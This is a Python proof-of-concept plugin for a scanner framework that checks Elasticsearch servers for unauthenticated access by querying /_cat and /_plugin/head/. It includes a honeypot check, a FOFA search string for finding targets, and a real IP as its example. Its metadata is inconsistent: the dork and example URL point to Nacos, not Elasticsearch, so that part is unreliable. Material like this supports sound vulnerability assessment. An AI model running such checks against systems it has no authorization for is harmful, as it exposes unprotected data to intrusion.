# coding:utf-8  
import requests
from lib.common import url_handle,get_random_ua
from lib.poc import POCBase

# ...
import urllib3
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2021-06-08",        # POC创建时间
        "UpdateDate" : "2021-06-08",        # POC创建时间
        "PocDesc" : """
        略  
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "Elasticsearch未授权访问",                        # 漏洞名称
        "VulnID" : "",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可

        "AppName" : "Elasticsearch",                     # 漏洞应用名称
        "AppVersion" : "",                  # 漏洞应用版本
        "VulnDate" : "2020-12-29",                    # 漏洞公开的时间,不知道就写能查到的最早的文献日期，格式：xxxx-xx-xx
        "VulnDesc" : """
        ElasticSearch 是一款Java编写的企业级搜索服务，启动此服务默认会开放9200端口，可被非法操作数据。
        """,                                # 漏洞简要描述

        "fofa-dork":"title:\"Nacos\"",                     # fofa搜索语句
        "example" : "https://47.108.74.113/v1/auth/users?pageNo=1&pageSize=100",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  

    }

    timeout = 10

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]

        host = self.host.replace("elastic://","http://")
        url = host + "/_cat" # url自己按需调整
        url1 = host + "/_plugin/head/"

        
        headers = {"User-Agent":get_random_ua(),
                    "Connection":"close",
                    "Content-Type": "application/x-www-form-urlencoded",}
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值，漏洞不存在则不动
            """
            req = requests.get(url,headers = headers , proxies = self.proxy , timeout = self.timeout,verify = False)
            req1 = requests.get(url1, headers = headers , proxies = self.proxy , timeout = self.timeout,verify = False)
            if req.status_code == 200 and "=^.^=" in req.text and req1.status_code == 200:
                vuln = [True,req.text]
            else:
                vuln = [False,req.text]
        except Exception as e:
            raise e
        
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()